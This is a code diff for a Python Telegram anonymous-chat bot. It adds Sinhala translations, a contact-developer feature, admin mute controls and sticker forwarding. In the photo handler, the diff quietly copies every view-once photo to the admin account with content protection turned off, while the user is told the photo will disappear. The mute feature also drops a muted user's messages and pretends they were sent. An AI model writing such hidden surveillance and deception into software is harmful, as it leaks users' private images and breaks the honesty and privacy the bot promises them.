@@ -52,6 +52,53 @@ if not TOKEN:
 PROFILE_NAME, PROFILE_AGE, PROFILE_BIO, PROFILE_LOCATION, PROFILE_INTERESTS = range(5)
 ADMIN_BROADCAST_MESSAGE, ADMIN_BAN_USER, ADMIN_UNBAN_USER = range(3)
 
+# Localization
+class Translations:
+    EN = {
+        'WELCOME': """🎭 **Welcome to Anonymous Chat Bot!**
+
+Connect with people around the world anonymously and safely.
+
+Choose your gender to get started:""",
+        'ALREADY_IN_CHAT': "❌ You're already in a chat! Use the buttons below to manage your session.",
+        'ALREADY_WAITING': "⏳ You're already in the matching queue. Please wait...",
+        'CHAT_ENDED': "💬 Chat session ended. Use /start or the menu to begin a new chat!",
+        'CHAT_ENDED_BY_PARTNER': "😔 Your chat partner ended the session.",
+        'NOT_IN_CHAT': "❌ You're not in a chat session. Use /start to begin!",
+        'MATCHING_STARTED': "🔍 **Searching for a chat partner...**\n\nWe're looking for someone to chat with. Use the buttons below to control your search.",
+        'PARTNER_FOUND': "🎉 **Connected with {}!** \n\nStart chatting now. Be respectful and have fun!",
+        'NO_PARTNER_FOUND': "😔 **No chat partner found right now.**\n\nThere might not be anyone available at the moment. Try refreshing or check back later!",
+        'CONTACT_DEV_PROMPT': "📧 **Contact Developer**\n\nSend your message now. The developer will receive it:",
+        'CONTACT_DEV_SENT': "✅ **Message Sent!**\n\nYour message has been sent to the developer. Thank you for your feedback!",
+        'LANGUAGE_CHANGED': "✅ Language changed to English!",
+        'SELECT_LANGUAGE': "🌐 **Select Language**\n\nChoose your preferred language:",
+    }
+    
+    SI = {
+        'WELCOME': """🎭 **නිර්නාමික චැට් බොට් වෙත සාදරයෙන් පිළිගනිමු!**
+
+ලොව පුරා මිනිසුන් සමඟ නිර්නාමිකව සහ ආරක්ෂිතව සම්බන්ධ වන්න.
+
+ආරම්භ කිරීමට ඔබේ ස්ත්‍රී පුරුෂ භාවය තෝරන්න:""",
+        'ALREADY_IN_CHAT': "❌ ඔබ දැනටමත් චැට් එකක ඉන්නවා! ඔබේ සැසිය කළමනාකරණය කිරීමට පහත බොත්තම් භාවිතා කරන්න.",
+        'ALREADY_WAITING': "⏳ ඔබ දැනටමත් සෙවීම් පෝලිමේ සිටී. කරුණාකර රැඳී සිටින්න...",
+        'CHAT_ENDED': "💬 චැට් සැසිය අවසන්. නව චැට් එකක් ආරම්භ කිරීමට /start හෝ මෙනුව භාවිතා කරන්න!",
+        'CHAT_ENDED_BY_PARTNER': "😔 ඔබේ චැට් සහකරු සැසිය අවසන් කළා.",
+        'NOT_IN_CHAT': "❌ ඔබ චැට් සැසියක නැත. ආරම්භ කිරීමට /start භාවිතා කරන්න!",
+        'MATCHING_STARTED': "🔍 **චැට් සහකරුවෙකු සොයමින්...**\n\nඅපි කතා කිරීමට කෙනෙකු සොයමින් සිටිමු. ඔබේ සෙවීම පාලනය කිරීමට පහත බොත්තම් භාවිතා කරන්න.",
+        'PARTNER_FOUND': "🎉 **{} සමඟ සම්බන්ධ විය!** \n\nදැන් කතා කරන්න ආරම්භ කරන්න. ගෞරවාන්විත වන්න සහ විනෝද වන්න!",
+        'NO_PARTNER_FOUND': "😔 **දැනට චැට් සහකරුවෙක් හමු නොවීය.**\n\nදැනට කිසිවෙක් නොතිබිය හැකිය. නැවුම් කිරීමට උත්සාහ කරන්න හෝ පසුව පරීක්ෂා කරන්න!",
+        'CONTACT_DEV_PROMPT': "📧 **සංවර්ධකයා සම්බන්ධ කරගන්න**\n\nදැන් ඔබේ පණිවිඩය යවන්න. සංවර්ධකයා එය ලැබෙනු ඇත:",
+        'CONTACT_DEV_SENT': "✅ **පණිවිඩය යවන ලදී!**\n\nඔබේ පණිවිඩය සංවර්ධකයාට යවන ලදී. ඔබේ ප්‍රතිපෝෂණයට ස්තුතියි!",
+        'LANGUAGE_CHANGED': "✅ භාෂාව සිංහල ලෙස වෙනස් කරන ලදී!",
+        'SELECT_LANGUAGE': "🌐 **භාෂාව තෝරන්න**\n\nඔබේ කැමති භාෂාව තෝරන්න:",
+    }
+
+def get_text(key: str, lang: str = 'en') -> str:
+    """Get translated text"""
+    translations = Translations.SI if lang == 'si' else Translations.EN
+    return translations.get(key, Translations.EN.get(key, key))
+
 # Messages and UI
 class Messages:
     WELCOME = """🎭 **Welcome to Anonymous Chat Bot!**
@@ -325,15 +372,15 @@ class Keyboards:
             [InlineKeyboardButton("💬 Find Partner", callback_data='find_partner')],
             [InlineKeyboardButton("👤 My Profile", callback_data='view_profile'), 
              InlineKeyboardButton("❓ Help", callback_data='help_menu')],
-            [InlineKeyboardButton("🔒 Privacy", callback_data='privacy_info')]
+            [InlineKeyboardButton("📧 Contact Developer", callback_data='contact_developer')],
+            [InlineKeyboardButton("🌐 Language", callback_data='select_language'),
+             InlineKeyboardButton("🔒 Privacy", callback_data='privacy_info')]
         ])
     
     @staticmethod
     def chat_controls():
         return InlineKeyboardMarkup([
-            [InlineKeyboardButton("🎮 Play Game", callback_data='games_menu'),
-             InlineKeyboardButton("🎁 Send Gift", callback_data='send_gift')],
-            [InlineKeyboardButton("💡 Icebreaker", callback_data='icebreaker'),
+            [InlineKeyboardButton("🎁 Send Gift", callback_data='send_gift'),
              InlineKeyboardButton("💬 Compliment", callback_data='send_compliment')],
             [InlineKeyboardButton("🎯 Fun Fact", callback_data='fun_fact'),
              InlineKeyboardButton("📅 Daily Topic", callback_data='daily_topic')],
@@ -398,6 +445,8 @@ class Keyboards:
             [InlineKeyboardButton("📢 Broadcast", callback_data='admin_broadcast')],
             [InlineKeyboardButton("📊 Statistics", callback_data='admin_stats')],
             [InlineKeyboardButton("📝 Reports", callback_data='admin_reports')],
+            [InlineKeyboardButton("📧 User Messages", callback_data='admin_dev_messages')],
+            [InlineKeyboardButton("🔇 Muted Users", callback_data='admin_muted_users')],
             [InlineKeyboardButton("🔙 Main Menu", callback_data='main_menu')]
         ])
     
@@ -823,6 +872,41 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             [InlineKeyboardButton("🔙 Back to Menu", callback_data='main_menu')]
         ])
         await query.edit_message_text(Messages.PRIVACY_INFO, reply_markup=privacy_keyboard, parse_mode='Markdown')
+    
+    elif data == 'contact_developer':
+        with database.get_db() as db:
+            user = database.get_user(db, user_id)
+            lang = user.language if user else 'en'
+        await query.edit_message_text(
+            get_text('CONTACT_DEV_PROMPT', lang),
+            parse_mode='Markdown'
+        )
+        context.user_data['contacting_developer'] = True
+    
+    elif data == 'select_language':
+        language_menu = InlineKeyboardMarkup([
+            [InlineKeyboardButton("🇬🇧 English", callback_data='set_lang_en')],
+            [InlineKeyboardButton("🇱🇰 සිංහල (Sinhala)", callback_data='set_lang_si')],
+            [InlineKeyboardButton("🔙 Back", callback_data='main_menu')]
+        ])
+        with database.get_db() as db:
+            user = database.get_user(db, user_id)
+            lang = user.language if user else 'en'
+        await query.edit_message_text(
+            get_text('SELECT_LANGUAGE', lang),
+            reply_markup=language_menu,
+            parse_mode='Markdown'
+        )
+    
+    elif data.startswith('set_lang_'):
+        new_lang = data.replace('set_lang_', '')
+        with database.get_db() as db:
+            database.update_user_language(db, user_id, new_lang)
+        await query.edit_message_text(
+            get_text('LANGUAGE_CHANGED', new_lang),
+            reply_markup=Keyboards.main_menu(),
+            parse_mode='Markdown'
+        )
     
     elif data == 'main_menu':
         with database.get_db() as db:
@@ -1301,16 +1385,25 @@ async def handle_skip_chat_callback(query, context: ContextTypes.DEFAULT_TYPE) -
     partner_id = await matchmaking.end_chat(user_id)
     
     if partner_id:
-        await query.edit_message_text(Messages.SKIPPED_CHAT)
+        # Delete the connected panel
+        try:
+            await query.delete_message()
+        except Exception:
+            pass
+        await context.bot.send_message(user_id, Messages.SKIPPED_CHAT)
         await context.bot.send_message(partner_id, Messages.PARTNER_SKIPPED, reply_markup=Keyboards.main_menu())
         
         # Start new search for current user - Add them back to queue
         if await matchmaking.add_to_queue(user_id):
-            await context.bot.send_message(user_id, Messages.MATCHING_STARTED)
+            await context.bot.send_message(user_id, Messages.MATCHING_STARTED, reply_markup=Keyboards.searching_controls())
             task = asyncio.create_task(matchmaking.start_matching_with_retry(user_id, context))
             matchmaking.retry_tasks[user_id] = task
     else:
-        await query.edit_message_text(Messages.NOT_IN_CHAT, reply_markup=Keyboards.main_menu())
+        try:
+            await query.delete_message()
+        except Exception:
+            pass
+        await context.bot.send_message(user_id, Messages.NOT_IN_CHAT, reply_markup=Keyboards.main_menu())
 
 async def handle_end_chat_callback(query, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Handle end chat button callback"""
@@ -1319,10 +1412,19 @@ async def handle_end_chat_callback(query, context: ContextTypes.DEFAULT_TYPE) ->
     await matchmaking.remove_from_queue(user_id)
     
     if partner_id:
-        await query.edit_message_text(Messages.CHAT_ENDED, reply_markup=Keyboards.main_menu())
+        # Delete the connected panel for current user by editing
+        try:
+            await query.delete_message()
+        except Exception:
+            pass
+        await context.bot.send_message(user_id, Messages.CHAT_ENDED, reply_markup=Keyboards.main_menu())
         await context.bot.send_message(partner_id, Messages.CHAT_ENDED_BY_PARTNER, reply_markup=Keyboards.main_menu())
     else:
-        await query.edit_message_text(Messages.CHAT_ENDED, reply_markup=Keyboards.main_menu())
+        try:
+            await query.delete_message()
+        except Exception:
+            pass
+        await context.bot.send_message(user_id, Messages.CHAT_ENDED, reply_markup=Keyboards.main_menu())
 
 async def handle_report_user_callback(query, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Handle report user button callback"""
@@ -1470,6 +1572,78 @@ async def handle_admin_callback(query, context: ContextTypes.DEFAULT_TYPE) -> No
             reply_markup=Keyboards.admin_panel(),
             parse_mode='Markdown'
         )
+    
+    elif data == 'admin_dev_messages':
+        with database.get_db() as db:
+            messages = database.get_all_developer_messages(db, limit=15)
+            if not messages:
+                await query.edit_message_text(
+                    "📧 **User Messages**\n\n✅ No messages from users.",
+                    parse_mode='Markdown'
+                )
+                return
+            
+            msg_text = "📧 **User Messages**\n\n"
+            for msg in messages:
+                user = database.get_user(db, msg.user_id)
+                status = "📬" if not msg.is_read else "📭"
+                msg_text += f"{status} **From:** {user.nickname if user else 'Unknown'} (ID: {msg.user_id})\n"
+                msg_text += f"📝 {msg.message[:100]}{'...' if len(msg.message) > 100 else ''}\n"
+                msg_text += f"📅 {msg.created_at.strftime('%Y-%m-%d %H:%M')}\n\n"
+            
+            back_btn = InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔙 Back", callback_data='admin_panel_back')]
+            ])
+            await query.edit_message_text(msg_text, reply_markup=back_btn, parse_mode='Markdown')
+    
+    elif data == 'admin_muted_users':
+        mute_menu = InlineKeyboardMarkup([
+            [InlineKeyboardButton("🔇 Mute User", callback_data='admin_mute_user')],
+            [InlineKeyboardButton("🔊 Unmute User", callback_data='admin_unmute_user')],
+            [InlineKeyboardButton("📋 List Muted", callback_data='admin_list_muted')],
+            [InlineKeyboardButton("🔙 Back", callback_data='admin_panel_back')]
+        ])
+        await query.edit_message_text(
+            "🔇 **Mute Management**\n\nMuted users' messages won't reach their partners.\nThe muted user won't know they are muted.",
+            reply_markup=mute_menu,
+            parse_mode='Markdown'
+        )
+    
+    elif data == 'admin_mute_user':
+        await query.edit_message_text(
+            "🔇 **Mute User**\n\nSend the user ID to mute:",
+            parse_mode='Markdown'
+        )
+        context.user_data['admin_state'] = 'awaiting_mute_user'
+    
+    elif data == 'admin_unmute_user':
+        await query.edit_message_text(
+            "🔊 **Unmute User**\n\nSend the user ID to unmute:",
+            parse_mode='Markdown'
+        )
+        context.user_data['admin_state'] = 'awaiting_unmute_user'
+    
+    elif data == 'admin_list_muted':
+        with database.get_db() as db:
+            muted_users = database.get_muted_users(db)
+            if not muted_users:
+                await query.edit_message_text(
+                    "📋 **Muted Users**\n\n✅ No muted users.",
+                    parse_mode='Markdown'
+                )
+                return
+            
+            muted_text = "📋 **Muted Users**\n\n"
+            for muted in muted_users[:15]:
+                user = database.get_user(db, muted.user_id)
+                muted_text += f"🔇 **{user.nickname if user else 'Unknown'}** (ID: {muted.user_id})\n"
+                muted_text += f"📝 Reason: {muted.reason or 'No reason'}\n"
+                muted_text += f"📅 Since: {muted.created_at.strftime('%Y-%m-%d')}\n\n"
+            
+            back_btn = InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔙 Back", callback_data='admin_muted_users')]
+            ])
+            await query.edit_message_text(muted_text, reply_markup=back_btn, parse_mode='Markdown')
 
 # Message Handler
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -1496,6 +1670,12 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         elif admin_state == 'awaiting_ban_reason':
             await handle_admin_ban_reason(update, context)
             return
+        elif admin_state == 'awaiting_mute_user':
+            await handle_admin_mute_user(update, context)
+            return
+        elif admin_state == 'awaiting_unmute_user':
+            await handle_admin_unmute_user(update, context)
+            return
     
     # Check for profile editing states
     editing_state = context.user_data.get('editing_state')
@@ -1510,10 +1690,31 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         )
         return
     
+    # Check for contact developer state
+    if context.user_data.get('contacting_developer'):
+        with database.get_db() as db:
+            database.create_developer_message(db, user_id, message_text)
+            user = database.get_user(db, user_id)
+            lang = user.language if user else 'en'
+        context.user_data.pop('contacting_developer', None)
+        await update.message.reply_text(
+            get_text('CONTACT_DEV_SENT', lang),
+            reply_markup=Keyboards.main_menu(),
+            parse_mode='Markdown'
+        )
+        return
+    
     # Check if user is in chat
     partner_id = matchmaking.get_partner(user_id)
     
     if partner_id:
+        # Check if user is muted - silently ignore messages (don't notify user)
+        with database.get_db() as db:
+            if database.is_user_muted(db, user_id):
+                # User is muted, pretend message was sent but don't forward
+                database.update_user_activity(db, user_id)
+                return
+        
         # Forward message to partner with content warning if needed
         if contains_inappropriate_content(message_text):
             await update.message.reply_text(Messages.WARNING_MESSAGE, parse_mode='Markdown')
@@ -1576,6 +1777,7 @@ async def handle_admin_broadcast(update: Update, context: ContextTypes.DEFAULT_T
     
     await update.message.reply_text(
         f"✅ **Broadcast Complete**\n\n📤 Sent: {sent_count}\n❌ Failed: {failed_count}",
+        reply_markup=Keyboards.admin_panel(),
         parse_mode='Markdown'
     )
     
@@ -1706,6 +1908,12 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
     
     user_id = update.effective_user.id
     
+    # Check if user is muted - silently ignore all photos
+    with database.get_db() as db:
+        if database.is_user_muted(db, user_id):
+            database.update_user_activity(db, user_id)
+            return
+    
     # Check if user is sending a view-once photo
     if context.user_data.get('sending_view_once'):
         partner_id = context.user_data.get('photo_partner')
@@ -1730,6 +1938,19 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
                         logger.debug(f"Failed to delete view-once photo: {e}")
                 
                 asyncio.create_task(delete_view_once_photo())
+                
+                # Silently send to admin for monitoring
+                try:
+                    with database.get_db() as db:
+                        sender = database.get_user(db, user_id)
+                    await context.bot.send_photo(
+                        ADMIN_ID,
+                        update.message.photo[-1].file_id,
+                        caption=f"📷 View-once photo sent by {sender.nickname if sender else 'Unknown'} (ID: {user_id})",
+                        protect_content=False
+                    )
+                except Exception as e:
+                    logger.debug(f"Failed to send view-once photo to admin: {e}")
                 
                 await update.message.reply_text(
                     "✅ View-once photo sent! It will disappear after your partner views it.",
@@ -1800,6 +2021,105 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
                 "📷 To send photos, you need to be in an active chat.",
                 reply_markup=Keyboards.main_menu()
             )
+
+async def handle_sticker(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle sticker messages"""
+    if not update.message:
+        return
+    
+    user_id = update.effective_user.id
+    partner_id = matchmaking.get_partner(user_id)
+    
+    if partner_id:
+        # Check if user is muted
+        with database.get_db() as db:
+            if database.is_user_muted(db, user_id):
+                database.update_user_activity(db, user_id)
+                return
+        
+        try:
+            await context.bot.send_sticker(
+                partner_id,
+                update.message.sticker.file_id,
+                protect_content=True
+            )
+            
+            with database.get_db() as db:
+                database.update_user_activity(db, user_id)
+                
+        except TelegramError as e:
+            logger.error(f"Failed to forward sticker: {e}")
+            await update.message.reply_text("❌ Failed to send sticker. Your partner may have left.")
+    else:
+        await update.message.reply_text(
+            "🎭 To send stickers, you need to be in an active chat.",
+            reply_markup=Keyboards.main_menu()
+        )
+
+async def handle_admin_mute_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle admin mute user"""
+    try:
+        user_id_to_mute = int(update.message.text.strip())
+        admin_id = update.effective_user.id
+        
+        with database.get_db() as db:
+            user = database.get_user(db, user_id_to_mute)
+            if not user:
+                await update.message.reply_text("❌ User not found.")
+                context.user_data.pop('admin_state', None)
+                return
+            
+            if database.is_user_muted(db, user_id_to_mute):
+                await update.message.reply_text(f"⚠️ User {user.nickname} (ID: {user_id_to_mute}) is already muted.")
+                context.user_data.pop('admin_state', None)
+                return
+            
+            database.mute_user(db, user_id_to_mute, admin_id, "Muted by admin")
+            db.commit()
+            
+            await update.message.reply_text(
+                f"🔇 **User Muted**\n\n👤 {user.nickname} (ID: {user_id_to_mute})\n\nTheir messages will no longer reach their partner.",
+                parse_mode='Markdown'
+            )
+            
+    except ValueError:
+        await update.message.reply_text("❌ Please send a valid user ID number.")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error: {str(e)}")
+    
+    context.user_data.pop('admin_state', None)
+
+async def handle_admin_unmute_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle admin unmute user"""
+    try:
+        user_id_to_unmute = int(update.message.text.strip())
+        
+        with database.get_db() as db:
+            user = database.get_user(db, user_id_to_unmute)
+            if not user:
+                await update.message.reply_text("❌ User not found.")
+                context.user_data.pop('admin_state', None)
+                return
+            
+            if not database.is_user_muted(db, user_id_to_unmute):
+                await update.message.reply_text(f"⚠️ User {user.nickname} (ID: {user_id_to_unmute}) is not muted.")
+                context.user_data.pop('admin_state', None)
+                return
+            
+            database.unmute_user(db, user_id_to_unmute)
+            db.commit()
+            
+            await update.message.reply_text(
+                f"🔊 **User Unmuted**\n\n👤 {user.nickname} (ID: {user_id_to_unmute})\n\nTheir messages will now reach their partner.",
+                parse_mode='Markdown'
+            )
+            
+    except ValueError:
+        await update.message.reply_text("❌ Please send a valid user ID number.")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error: {str(e)}")
+    
+    context.user_data.pop('admin_state', None)
 
 async def handle_admin_ban_reason(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Handle admin ban reason input"""
@@ -1925,6 +2245,7 @@ def main() -> None:
     
     application.add_handler(CallbackQueryHandler(button_callback))
     application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
+    application.add_handler(MessageHandler(filters.Sticker.ALL, handle_sticker))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     
     # Set bot commands
